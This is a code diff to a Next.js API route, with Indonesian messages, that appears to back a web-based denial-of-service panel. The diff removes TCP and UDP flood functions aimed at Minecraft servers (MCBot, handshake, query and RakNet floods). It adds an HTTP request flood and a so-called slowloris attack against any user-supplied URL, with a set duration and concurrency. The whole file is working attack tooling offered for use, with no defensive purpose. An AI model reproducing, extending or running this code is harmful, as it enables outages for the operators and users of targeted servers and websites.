@@ -1,29 +1,22 @@
 import { NextResponse } from "next/server";
-import dgram from "dgram";
-import net from "net";
+import axios from "axios";
 
 export async function POST(req) {
     try {
-        const { serverIp, serverPort, method, duration } = await req.json();
-        const attackDuration = parseInt(duration) * 1000; // Convert ke milidetik
+        const { targetUrl, method, duration, concurrent } = await req.json();
+        const attackDuration = parseInt(duration) * 1000; 
         const endTime = Date.now() + attackDuration;
 
-        if (!serverIp || !serverPort || !method) {
+        if (!targetUrl || !method || !duration || !concurrent) {
             return NextResponse.json({ message: "Input tidak valid!" }, { status: 400 });
         }
 
         switch (method) {
-            case "mcbot":
-                runMCBotAttack(serverIp, serverPort, endTime);
+            case "http":
+                runHttpFlood(targetUrl, concurrent, endTime);
                 break;
-            case "handshake":
-                runHandshakeFlood(serverIp, serverPort, endTime);
-                break;
-            case "query":
-                runQueryFlood(serverIp, serverPort, endTime);
-                break;
-            case "raknet":
-                runRakNetFlood(serverIp, serverPort, endTime);
+            case "slowloris":
+                runSlowlorisAttack(targetUrl, concurrent, endTime);
                 break;
             default:
                 return NextResponse.json({ message: "Metode tidak valid!" }, { status: 400 });
@@ -36,52 +29,25 @@ export async function POST(req) {
     }
 }
 
-// MCBOT Attack
-function runMCBotAttack(ip, port, endTime) {
+// HTTP Flood Attack
+function runHttpFlood(url, concurrent, endTime) {
     while (Date.now() < endTime) {
-        try {
-            const client = new net.Socket();
-            client.connect(port, ip, () => {
-                client.write("\x0f");
-                client.destroy();
-            });
-        } catch (err) {}
+        for (let i = 0; i < concurrent; i++) {
+            axios.get(url).catch(() => {});
+        }
     }
 }
 
-// Handshake Flood
-function runHandshakeFlood(ip, port, endTime) {
+// Slowloris Attack
+function runSlowlorisAttack(url, concurrent, endTime) {
     while (Date.now() < endTime) {
-        try {
-            const client = new net.Socket();
-            client.connect(port, ip, () => {
-                client.write("\x00\x00\x0f");
-                client.destroy();
-            });
-        } catch (err) {}
+        for (let i = 0; i < concurrent; i++) {
+            axios({
+                method: "GET",
+                url: url,
+                headers: { "Connection": "keep-alive" },
+                timeout: 10000
+            }).catch(() => {});
+        }
     }
-}
-
-// Query Flood
-function runQueryFlood(ip, port, endTime) {
-    const client = dgram.createSocket("udp4");
-    while (Date.now() < endTime) {
-        try {
-            const message = Buffer.from("\xFE\xFD\x09\x00\x00\x00\x00");
-            client.send(message, port, ip);
-        } catch (err) {}
-    }
-    client.close();
-}
-
-// RakNet Flood (Bedrock)
-function runRakNetFlood(ip, port, endTime) {
-    const client = dgram.createSocket("udp4");
-    while (Date.now() < endTime) {
-        try {
-            const message = Buffer.alloc(24, Math.random() * 255);
-            client.send(message, port, ip);
-        } catch (err) {}
-    }
-    client.close();
 }
